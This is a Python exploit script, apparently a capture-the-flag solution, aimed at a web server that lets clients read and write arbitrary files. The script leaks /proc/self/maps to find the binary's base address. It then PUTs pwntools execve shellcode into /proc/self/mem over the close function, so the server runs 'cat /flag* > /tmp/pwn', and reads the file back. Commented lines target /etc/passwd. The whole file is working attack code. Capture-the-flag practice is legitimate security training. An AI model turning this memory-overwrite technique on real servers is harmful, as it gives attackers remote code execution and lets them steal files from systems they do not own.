import requests
import sys
from pwn import *
import re

# Set architecture for shellcode
context.arch = 'amd64'

def get_base_address(session, url):
    print("[*] Leaking /proc/self/maps...")
    r = session.get(f"{url}/?path=/proc/self/maps")
    if r.status_code != 200:
        print(f"[-] Failed to leak maps: {r.status_code}")
        print(r.text)
        sys.exit(1)
    
    print("[+] Maps leaked.")
    # Find the base address of the server binary
    lowest_base = None
    
    for line in r.text.splitlines():
        if 'server' in line:
            parts = line.split('-')
            base = int(parts[0], 16)
            if lowest_base is None or base < lowest_base:
                lowest_base = base
                
    if lowest_base is not None:
        print(f"[+] Found true base address: {hex(lowest_base)}")
        return lowest_base

    print("Full maps:")
    print(r.text)
    
    if 'found_base' in locals():
        return found_base
            
            
    # Fallback: maybe just the first executable segment?
    # Or check output content
    print(r.text)
    print("[-] Could not determine base address from maps.")
    sys.exit(1)

def exploit(url):
    s = requests.Session()
    
    base_addr = get_base_address(s, url)
    
    # Offset of close found via check_binary.py
    # Found close: close at 0x167620
    offset_close = 0x167620
    target_addr = base_addr + offset_close
    print(f"[+] Target address (close): {hex(target_addr)}")
    
    # 2. Overwrite send_response with shellcode
    # Shellcode to cat /flag* to /tmp/pwn
    # We use 'sh -c' to handle the wildcard
    # Try /etc/passwd first to verify execution
    # Try /etc/passwd first to verify execution
    # cmd = "cat /etc/passwd > /tmp/pwn"
    # Also sleep to confirm execution via timing
    # cmd = "sleep 5; cat /etc/passwd > /tmp/pwn"
    cmd = "cat /flag* > /tmp/pwn"
    shellcode = asm(shellcraft.linux.execve("/bin/sh", ["/bin/sh", "-c", cmd], 0))
    
    print(f"[*] Sending shellcode ({len(shellcode)} bytes) to overwrite send_response...")
    
    # PUT /?path=/proc/self/mem&offset=TARGET
    # Using 'data' for body
    try:
        r = s.put(f"{url}/", params={
            'path': '/proc/self/mem',
            'offset': str(target_addr)
        }, data=shellcode)
        print(f"[*] PUT response: {r.status_code}")
    except Exception as e:
        print(f"[*] PUT failed (expected if shellcode executed): {e}")

    # The PUT request itself calls send_response at the end!
    
    # The PUT request itself calls send_response at the end!
    # So the shellcode should have triggered.
    # Connection might be closed or hung.
    
    print("[*] Shellcode sent. Triggering retrieval...")
    
    # 3. Read the flag from /tmp/pwn
    # Need a new request. The previous thread might be dead/replaced by shell.
    # But files persist in /tmp (assuming same container/namespace).
    
    # Wait a bit
    time.sleep(1)
    
    try:
        r = requests.get(f"{url}/?path=/tmp/pwn")
        if r.status_code == 200:
            print("[+] Flag retrieved!")
            print(r.text)
            if "C2C{" in r.text:
                print("SUCCESS")
        else:
            print(f"[-] Failed to retrieve flag file: {r.status_code}")
            print(r.text)
    except Exception as e:
        print(f"[-] Error retrieving flag: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python exploit_ns3.py <url>")
        sys.exit(1)
    
    url = sys.argv[1].rstrip('/')
    exploit(url)
